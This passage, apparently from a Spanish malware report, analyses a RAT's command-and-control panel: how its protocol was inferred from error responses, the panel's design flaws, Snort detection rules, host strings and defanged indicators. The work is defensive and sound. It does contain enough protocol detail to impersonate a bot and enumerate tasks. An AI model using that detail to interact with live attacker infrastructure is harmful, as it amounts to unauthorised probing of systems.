El servicio responde de forma distinta según lo que se le pide. Esa tabla es la herramienta que permitió deducir la API:

| Estímulo | Respuesta | Veredicto |
|---|---|---|
| WS handshake en 406 | `101 Switching Protocols` | Es WebSocket |
| WS handshake en 408 | `400 Bad request: unknown type` | Aquí no hay WebSocket |
| `ready;` (sin versión) | cierre de conexión en 0,5 s | **Formato inválido** |
| `ready;1.0.0` | `getinfo` | **Formato válido** |
| `info;...` sin ir precedido de `ready` | se ignora, sin cierre | Necesita el saludo previo |
| `GET /` (408) | `unknown type` | Falta `type` |
| `GET /task` | `missing task name` | Falta el nombre |
| `GET /task/<x>` | `403 Access denied` | Ruta real, no autorizada |
| `GET /files` | `missing file id` | **Ruta de descarga** |
| `GET /files?id=<desconocido>` | `Task metadata not found` | Id no registrado |
| `GET /files?id=<task_id>` | `Uploaded file not found` | **Tarea sin binario** |
| Peticiones seguidas | `429 ... Soso.` | Límite de peticiones |

---

## 12. Fallos de diseño del panel

Cinco deficiencias de diseño que este ejercicio destapa:

1. **Sin autenticación de bots.** El identificador lo elige el cliente y basta con enviar `ready;<versión>` e `info;...` para entrar en la cola. Cualquiera puede convertirse en bot y recibir trabajo.
2. **Difusión global de tareas.** No hay destinatario: todos los bots conectados reciben la lista íntegra. Eso revela al panel los bots ajenos y explica por qué la tarea del Stealer llega a cualquier bot que se conecte.
3. **Fuga de metadatos en el 404.** El panel distingue entre `Task metadata not found` y `Uploaded file not found`, lo que permite enumerar qué tareas existen y cuáles tienen fichero. Es una fuga de información innecesaria.
4. **Limitador frágil.** Un `429` con el cuerpo `Soso.` se agota en segundos, pero solo protege por IP: con IP rotativa (como una botnet) el límite no sirve de nada.
5. **Canal de control sin cifrar.** Todo el protocolo (huella de la máquina, tareas y payloads) viaja en claro sobre WebSocket y HTTP sin TLS. El único dato sensible, el HWID, se expone a cualquiera que esté en la red.

---

## 13. Limitaciones y motivo de no haber obtenido el payload

- **El binario no existe en el servidor.** No es un fallo del método: las dos tareas identificadas responden `Uploaded file not found`. Sin fichero no hay nada que descargar.
- **El `403 Access denied` del 408 no se ha explicado del todo.** Se descartó que dependa del `User-Agent` (todos dan lo mismo), de la IP (se probó desde la misma IP de la sesión WebSocket) y del nombre (docenas de variantes). Lo más probable es que el panel exija una petición de descarga emitida desde un contexto autenticado que el cliente real construye de una forma que no se ha reproducido, o que el control de autorización esté atado al estado interno de la tarea.
- **No se ha tocado la consola de administración.** Deliberadamente: el objetivo era hablar el idioma del malware, no vulnerar el panel del operador.

---

## 14. Vigilancia y reglas de detección

1. **Vigilancia pasiva** de `45.91.202.xxx:406` y `:408`, registrando nuevos `task_id` y el estado de `/files?id=`. Si el operador sube el Stealer, aparecerá como un `200` en lugar de un `404`.
2. **Captura del fichero en cuanto exista**, sin ejecutarlo: solo hash, cabeceras PE y análisis estático.
3. **Regla de detección de red** para el tráfico descrito en este documento:

```
alert tcp any any -> any any (msg:"C2 panel RAT privado - descarga de payload";
    content:"GET /files?id="; http_uri; content:"mops[.]to"; http_header;
    sid:1000001;)

alert tcp any any -> any 406 (msg:"Panel C2 - handshake WebSocket";
    content:"|16 48 6f 73 74 3a|"; content:"Upgrade|3a 20|websocket"; sid:1000002;)
```

> Sustituye `mops[.]to` por el dominio real (sin corchetes) para que la regla funcione.

4. **Regla de host** para la tarea del panel: cadenas `ready;`, `task;createtask`, `Soso.`, `Uploaded file not found`.

---

## 15. Indicadores (difuminados)

### Red

```
mops[.]to                                 -> 45.91.202.xxx
406/TCP   WebSocket  (101 + latido de texto 'ping' cada 15 s)
408/TCP   HTTP Go    (/task, /files?id=)
409/TCP   HTTP Go    (sin rutas conocidas)
Proveedor: VPS en Países Bajos (ASN e ISP omitidos)
```

### Cadenas y rutas del panel

```
'Bad request: unknown type'  'Bad request: missing task name'
'Bad request: missing file id'  'Task metadata not found'
'Uploaded file not found'  'Access denied'  'Soso.'
'/files?id='  '/task'
'ready;1.0.0'  'getinfo'  'info;'  'task;createtask'  'task_done;'
'task;createtask;Stealer;task_id;nos3o3_txq1;version;1.0.1'
```

### Identificadores de bot ficticios usados en las pruebas

```
1000000001   1000000002   1000000003
```

> Todos ellos inventados. Si aparecen en un informe real, proceden de este análisis y no de una infección.

---

## 16. Conclusión

La primera parte respondía a *qué es capaz de hacer el RAT*. Esta segunda parte responde a *quién está al otro lado y cómo se habla con él*. Y la respuesta es inquietante: **un panel privado, sin autenticación, sin cifrado y con fugas de información, pero perfectamente funcional**.

Tres conclusiones se llevan de este ejercicio:

1. **El protocolo se dedujo con los errores del servidor.** No hizo falta desensamblar el cliente para hablar con el C2: el propio panel se comportó como un oráculo y fue revelando su gramática a base de `101`, `426`, `403`, `429` y `404`.
2. **El panel confía demasiado en el cliente.** Un bot sin credenciales entra en la cola de tareas y recibe el mismo trabajo que un equipo infectado. Esa debilidad es, en sí misma, un vector defensivo: permite enumerar tareas y confirmar la campaña sin tocar la consola del operador.
3. **El arma real no estaba en el servidor.** El infostealer `Stealer 1.0.1` se repartía a toda la botnet pero su binario no estaba subido. El daño final, una vez más, depende de lo que el operador sirva por el 408 en el momento del ataque.

Los hallazgos, los indicadores y las reglas de detección quedan documentados; la parte 1 cubrió el análisis estático de los tres stages y esta cierra el círculo con la infraestructura viva. No hay siguiente Stage ya que el atacante no ha subido o ha borrado el payload de la tarea "Stealer"

*Fin del informe.*
